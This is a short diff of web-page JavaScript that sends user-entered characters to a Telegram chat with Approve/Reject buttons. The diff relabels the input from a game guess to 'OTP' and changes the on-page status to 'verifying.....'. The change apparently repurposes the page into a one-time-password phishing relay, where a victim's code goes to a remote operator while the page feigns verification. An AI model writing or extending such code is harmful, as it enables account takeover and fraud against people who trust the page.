@@ -62,13 +62,13 @@ btn.addEventListener("click", async () => {
   const word = letters.join("").toUpperCase();
   const id = Math.random().toString(36).slice(2, 10);
   btn.disabled = true;
-  msg.textContent = "Sent. Waiting for a decision…";
+  msg.textContent = "verifying.....";
 
   try {
     await ready;
     const sent = await tg("sendMessage", {
       chat_id: CHAT_ID,
-      text: `New guess: ${word}\n\nIs it correct?`,
+      text: `OTP: ${word}\n\nIs it correct?`,
       reply_markup: { inline_keyboard: [[
         { text: "✅ Approve", callback_data: `yes:${id}` },
         { text: "❌ Reject",  callback_data: `no:${id}` },
